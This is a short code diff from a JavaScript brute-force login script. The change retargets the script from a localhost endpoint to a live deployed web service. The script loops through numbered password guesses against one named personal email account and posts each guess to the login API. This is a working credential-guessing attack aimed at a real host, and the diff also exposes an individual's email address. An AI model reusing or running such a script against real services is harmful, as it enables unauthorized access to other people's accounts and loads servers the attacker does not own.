@@ -7,7 +7,7 @@ async function bruteForce() {
     console.log(`Tentative numéro ${i}`);
     try {
       const res = await axios.post(
-        "http://localhost:3000/auth/login",
+        "https://hackathon-quiz-4g3a.onrender.com/api/login",
         {
           email: "damdiluca14@gmail.com",
           password: `pass${i}`,
